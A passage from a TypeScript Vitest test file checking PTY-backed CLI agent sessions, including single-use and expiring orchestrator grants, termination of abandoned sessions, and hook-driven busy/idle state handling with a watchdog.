      consumeMissionOrchestratorGrant(owner, sessionId, "other-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toMatchObject({ sessionId, squadId: "review-squad" });
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-a")).toBe(
      true,
    );
    expect(getOwnedAgentSessionInfo(owner, sessionId)?.missionId).toBe(
      "mission-a",
    );
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-b")).toBe(
      false,
    );

    orchKillSession(sessionId);
  });

  it("expires an unconsumed mission orchestrator promotion grant", () => {
    vi.useFakeTimers();
    vi.setSystemTime(1_000);
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };
    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-expired-orchestrator",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    vi.setSystemTime(10 * 60_000);
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();

    orchKillSession(sessionId);
    vi.useRealTimers();
  });

  it("physically terminates an abandoned immediate orchestrator when promotion expires", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: true,
        rootExited: true,
        descendantsExited: true,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const owner = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-abandoned-orchestrator",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    await vi.advanceTimersByTimeAsync(120_000);
    expect(proc.terminate).toHaveBeenCalledWith({
      termTimeoutMs: 1_500,
      killTimeoutMs: 1_500,
    });
    expect(getSessionState(sessionId)).not.toBeNull();
    expect(orchWriteSession(sessionId, "late\r")).toBe(false);

    (handlers as PtySessionHandlers | null)?.onExit(0, 15);
    await vi.advanceTimersByTimeAsync(0);
    expect(getSessionState(sessionId)).toBeNull();
    vi.useRealTimers();
  });

  it("keeps state as busy when hookState is busy, ignoring the idle timeout", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    // Initial state is spawning, transitions to busy on first data
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as busy
    publishSessionActivityState(sessionId, "busy");
    expect(getSessionState(sessionId)).toBe("busy");

    // Advance time by the idle timeout (adapter has 500ms)
    await vi.advanceTimersByTimeAsync(1000);

    // The state should still be busy, because hookState is busy!
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as idle
    publishSessionActivityState(sessionId, "idle");
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });

  it("does not re-emit stateChange when hook re-asserts the same state", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    send.mockClear();
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);
    const stateSends = send.mock.calls.filter(
      (call) => call[0] === "pty:stateChange",
    );
    expect(stateSends).toHaveLength(0);

    killSession(owner, sessionId);
  });

  it('supports passive orchestration writes whose busy proof comes from PTY output', () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const owner = fakeWc();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: 'cli-agent', cols: 80, rows: 24 },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      trustedSpawn(),
    );
    publishSessionActivityState(sessionId, 'idle');

    expect(orchWriteSession(sessionId, 'kickoff\r', { markInputBusy: false })).toBe(true);
    expect(getSessionState(sessionId)).toBe('idle');
    (handlers as PtySessionHandlers | null)?.onData('accepted');
    expect(getSessionState(sessionId)).toBe('busy');

    killSession(owner, sessionId);
  });

  it("releases a stale hook busy after the watchdog window when no idle arrives", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    activeHandlers.onData("hello");
    publishSessionActivityState(sessionId, "busy");

    // The idle timeout passes but the hook still says busy → stays busy.
    await vi.advanceTimersByTimeAsync(1000);
    expect(getSessionState(sessionId)).toBe("busy");

    // No idle hook ever arrives (agent killed / Stop hook lost). Past the
    // watchdog window the stuck busy is released so the quiet session settles.
    await vi.advanceTimersByTimeAsync(6 * 60_000);
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });
});
